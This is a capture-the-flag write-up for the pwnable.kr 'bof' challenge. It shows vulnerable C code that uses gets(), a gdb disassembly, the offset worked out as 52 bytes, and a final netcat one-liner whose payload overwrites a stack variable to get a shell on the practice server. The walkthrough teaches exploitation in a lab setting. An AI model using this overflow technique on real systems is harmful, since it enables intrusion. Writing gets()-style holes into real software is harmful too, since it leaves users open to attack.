# bof

## Code
In this challenge, we are given:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

## Solution
The goal is to make `0xdeadbeef` to become `0xcafebabe` such that `key == 0xcafebabe` will be true. In order to do that, we have to overflow `gets(overflowme)` so that the stored value of `0xdeadbeef` becomes `0xcafebabe`.

**Step 1: disassemble `func()`**:
```
Dump of assembler code for function func:
   0x8000062c <+0>:	push   ebp
   0x8000062d <+1>:	mov    ebp,esp
   0x8000062f <+3>:	sub    esp,0x48
=> 0x80000632 <+6>:	mov    eax,gs:0x14
   0x80000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x8000063b <+15>:	xor    eax,eax
   0x8000063d <+17>:	mov    DWORD PTR [esp],0x8000078c
   0x80000644 <+24>:	call   0xb7e87770 <puts>
   0x80000649 <+29>:	lea    eax,[ebp-0x2c]
   0x8000064c <+32>:	mov    DWORD PTR [esp],eax
   0x8000064f <+35>:	call   0xb7e86dd0 <gets>
   0x80000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x8000065b <+47>:	jne    0x8000066b <func+63>
   0x8000065d <+49>:	mov    DWORD PTR [esp],0x8000079b
   0x80000664 <+56>:	call   0xb7e5f460 <system>
   0x80000669 <+61>:	jmp    0x80000677 <func+75>
   0x8000066b <+63>:	mov    DWORD PTR [esp],0x800007a3
   0x80000672 <+70>:	call   0xb7e87770 <puts>
   0x80000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x8000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x80000681 <+85>:	je     0x80000688 <func+92>
   0x80000683 <+87>:	call   0xb7f25080 <__stack_chk_fail>
   0x80000688 <+92>:	leave  
   0x80000689 <+93>:	ret    
End of assembler dump.
```

From this block: we know the input arguments is stored at address of `ebp-0x2c`:
```
   0x80000649 <+29>:	lea    eax,[ebp-0x2c]
   0x8000064c <+32>:	mov    DWORD PTR [esp],eax
   0x8000064f <+35>:	call   0xb7e86dd0 <gets>
```

**Step 2: find the address that stores the input arguments**:
```
x $ebp-0x2c
```
Returns:
```
0xbffff2ec:	0x8000073a
```

**Step 3: find the address that stores the `0xdeadbeef`**:

From this line, we can deduce that the memory location of variable `key` is stored at `ebp+0x8`:
```
   0x80000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
```

Hence, the address is
```
x/wx $ebp+0x8
0xbffff320:	0xdeadbeef
```

**Step 4: perform the overflow***:

So, we have to overflow the stack:
```
-----------------------------
0xbffff320 -> 0xdeadbeef
-----------------------------
.
. // some other data
.
.
-----------------------------
0xbffff2ec -> input arguments
-----------------------------
```

```
echo $((0xbffff320)) - $((0xbffff2ec)) | bc
```

The distance between `0xbffff2ec` and `0xbffff320` is 52 bytes.

So, combining everything:
```
(python -c "print 'A'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
cat flag
```
